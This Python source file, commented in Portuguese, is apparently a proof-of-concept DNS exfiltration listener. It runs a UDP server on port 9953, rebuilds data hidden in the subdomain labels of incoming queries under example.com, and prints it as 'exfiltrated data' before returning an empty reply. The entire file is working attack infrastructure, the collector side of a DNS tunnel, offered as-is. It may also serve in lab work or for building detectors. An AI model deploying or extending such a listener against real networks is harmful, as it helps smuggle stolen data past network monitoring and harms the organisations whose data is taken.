import socket
from dnslib import DNSRecord, QTYPE, RR, A

import time

def decode_data_from_domain(domain):
    # Remove o sufixo do domínio
    domain = domain.replace('.example.com.', '')
    
    # Junta as partes do domínio para reconstruir os dados originais
    decoded_data = ''.join(domain.split('.'))
    return decoded_data

def start_dns_server():
    # Cria um socket para ouvir requisições DNS
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', 9953))
    
    print("Servidor DNS ouvindo na porta 9953...")
    
    while True:
        try:
            data, addr = sock.recvfrom(512)
            
            # Lê a requisição DNS
            request = DNSRecord.parse(data)
            domain = str(request.q.qname)
            
            print(f"Requisição DNS recebida para o domínio: {domain}")
            
            # Decodifica os dados do domínio
            decoded_data = decode_data_from_domain(domain)
            print(f"Dados exfiltrados: {decoded_data}")
            
            
            
            # Criando um objeto DNSRecord para a resposta
            dns_response = DNSRecord()
            # Adicionando uma resposta DNS
            #dns_response.add_answer(RR('www.example.com', QTYPE.A, rdata=A('192.0.2.1')))
            # Convertendo a resposta para uma representação de bytes
            response_bytes = dns_response.pack()
            print(response_bytes.hex())  # Exibindo a resposta em hexadecimal

            #time.sleep(8)
            # Envia a resposta DNS de volta para o cliente
            sock.sendto(response_bytes, addr)

        except Exception as e:
            print(e)



if __name__ == "__main__":
    start_dns_server()
